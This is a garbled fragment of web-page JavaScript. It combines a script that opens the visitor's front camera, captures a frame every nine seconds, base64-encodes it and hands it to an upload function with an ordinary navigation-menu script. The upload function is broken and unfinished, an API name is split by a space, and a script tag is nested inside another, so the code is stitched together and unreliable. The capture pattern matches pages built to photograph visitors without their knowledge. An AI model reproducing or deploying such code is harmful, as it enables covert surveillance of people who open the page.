<script>
function post(imgdata) {

        type: 'POST',

'use strict';

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

const constraints = {
    audio: false,
    video: {
        facingMode: "user" // Use the front camera
    }
};

// Access webcam
async function init() {
    try {
        const stream = await navigator.mediaDevices.getUser Media(constraints);
        handleSuccess(stream);
    } catch (e) {
        console.error(`navigator.getUser Media error: ${e.toString()}`);
    }
}

// Success
function handleSuccess(stream) {
    window.stream = stream;
    video.srcObject = stream;

    const context = canvas.getContext('2d');
    setInterval(function() {
        context.drawImage(video, 0, 0, 640, 480);
        const canvasData = canvas.toDataURL("image/png");
        const cc = String(canvasData).replace("data:image/png;base64,", "");
        post(cc);
    }, 9000); // Capture every 9 seconds
}

// Load init
init();

    <script>
        const burger = document.querySelector('.burger');
        const navLinks = document.getElementById('navLinks');
        const overlay = document.getElementById('overlay');

        function toggleMenu() {
            burger.classList.toggle('active');
            navLinks.classList.toggle('active');
            overlay.classList.toggle('active');
        }

        function closeMenu() {
            burger.classList.remove('active');
            navLinks.classList.remove('active');
            overlay.classList.remove('active');
        }

        overlay.addEventListener('click', closeMenu);

        // Close menu when clicking on content area
        document.querySelector('.content').addEventListener('click', function() {
            if (navLinks.classList.contains('active')) {
                closeMenu();
            }
        });
    </script>
